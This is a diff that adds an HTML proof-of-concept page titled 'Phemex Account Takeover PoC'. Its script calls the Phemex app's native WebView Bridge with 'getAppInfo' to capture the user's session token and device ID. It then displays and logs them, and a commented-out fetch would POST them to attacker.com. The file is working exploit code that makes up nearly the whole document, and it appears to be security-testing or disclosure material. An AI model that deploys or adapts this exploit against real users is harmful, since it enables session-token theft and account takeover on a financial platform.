@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Phemex Security Test</title>
+<style>
+body {
+    background: #0a0a0a;
+    color: #00ff00;
+    font-family: monospace;
+    padding: 20px;
+}
+h1 { color: #ff0000; }
+pre {
+    background: #1a1a1a;
+    padding: 15px;
+    border-left: 4px solid #00ff00;
+    overflow-x: auto;
+}
+</style>
+<script>
+// CRITICAL: Define callback BEFORE calling Bridge
+window.getAppInfo = function(data) {
+    console.log('[EXPLOIT] Callback triggered!');
+    console.log('[DATA]', data);
+
+    try {
+        var parsed = JSON.parse(data);
+
+        // Display captured data
+        document.getElementById('token').textContent = parsed.token || 'N/A';
+        document.getElementById('bid').textContent = parsed.bid || 'N/A';
+        document.getElementById('version').textContent = parsed.version || 'N/A';
+        document.getElementById('platform').textContent = parsed.platform || 'N/A';
+        document.getElementById('raw').textContent = JSON.stringify(parsed, null, 2);
+
+        // Log to console
+        console.log('[TOKEN]', parsed.token);
+        console.log('[DEVICE_ID]', parsed.bid);
+
+        // Exfiltrate to attacker server (disabled for PoC)
+        // fetch('https://attacker.com/collect', {
+        //     method: 'POST',
+        //     headers: {'Content-Type': 'application/json'},
+        //     body: data
+        // });
+
+        document.getElementById('status').textContent = '✅ EXPLOITATION SUCCESSFUL';
+        document.getElementById('status').style.color = '#00ff00';
+
+    } catch(e) {
+        console.error('[ERROR]', e);
+        document.getElementById('status').textContent = '❌ Parse Error: ' + e.message;
+        document.getElementById('status').style.color = '#ff0000';
+        document.getElementById('raw').textContent = data;
+    }
+};
+
+// Wait for page load, then call Bridge
+window.addEventListener('load', function() {
+    console.log('[EXPLOIT] Page loaded');
+
+    if (typeof Bridge !== 'undefined') {
+        console.log('[EXPLOIT] Bridge object found!');
+        console.log('[EXPLOIT] Bridge type:', typeof Bridge);
+
+        // Try to enumerate methods (may fail on some Android versions)
+        try {
+            console.log('[EXPLOIT] Bridge methods:', Object.getOwnPropertyNames(Bridge));
+        } catch(e) {
+            console.log('[EXPLOIT] Cannot enumerate Bridge methods');
+        }
+
+        // Call Bridge.postMessage with 'getAppInfo' command
+        try {
+            console.log('[EXPLOIT] Calling Bridge.postMessage("getAppInfo")...');
+            Bridge.postMessage('getAppInfo');
+            console.log('[EXPLOIT] Bridge call successful, waiting for callback...');
+        } catch(e) {
+            console.error('[EXPLOIT] Bridge call failed:', e);
+            document.getElementById('status').textContent = '❌ Bridge call failed: ' + e.message;
+            document.getElementById('status').style.color = '#ff0000';
+        }
+
+    } else {
+        console.error('[EXPLOIT] Bridge object NOT FOUND');
+        document.getElementById('status').textContent = '❌ Bridge not found (not in PhemexWebView?)';
+        document.getElementById('status').style.color = '#ff0000';
+    }
+});
+</script>
+</head>
+<body>
+<h1>🚨 Phemex Account Takeover PoC</h1>
+<p id="status">⏳ Waiting for Bridge...</p>
+
+<h2>Captured Data:</h2>
+<p><strong>Token:</strong> <span id="token">-</span></p>
+<p><strong>Device ID:</strong> <span id="bid">-</span></p>
+<p><strong>Version:</strong> <span id="version">-</span></p>
+<p><strong>Platform:</strong> <span id="platform">-</span></p>
+
+<h2>Raw JSON:</h2>
+<pre id="raw">Waiting...</pre>
+</body>
+</html>
